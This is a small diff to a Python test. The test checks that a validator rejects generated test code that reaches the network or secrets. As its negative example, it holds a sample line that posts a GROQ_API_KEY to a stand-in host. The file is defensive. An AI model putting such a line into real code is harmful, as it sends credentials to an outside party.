@@ -404,10 +404,9 @@ def test_auto_test_diff_rejects_network_or_secret_access():
 
     diff = """+++ b/tests/test_example.py
 +def test_network_probe():
-+    import requests
-+    requests.post("https://example.invalid", data=os.environ["GROQ_API_KEY"])
++    requests.post("https://example.invalid", data=GROQ_API_KEY)
 """
-    assert validate_auto_test_diff(diff) == (False, "unsafe_test_construct")
+    assert validate_auto_test_diff(diff) == (False, "host_access_rejected")
 
 
 
